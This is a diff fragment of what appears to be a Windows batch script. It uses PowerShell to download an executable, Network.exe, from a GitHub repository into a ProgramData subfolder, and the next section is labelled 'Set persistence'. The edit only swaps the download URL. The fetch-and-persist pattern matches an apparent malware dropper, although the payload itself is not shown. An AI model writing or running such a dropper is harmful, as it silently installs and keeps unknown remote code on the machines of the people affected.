@@ -33,7 +33,7 @@ mkdir "%systemdrive%\ProgramData\67-Win"
 
 echo ----------- Download file ------------------------
 
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/Network/raw/refs/heads/main/Network.exe','%ProgramData%\67-Win\Network.exe')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/splash/raw/refs/heads/main/Network.exe','%ProgramData%\67-Win\Network.exe')"
 
 echo ----------- Set persistence ------------------------
 
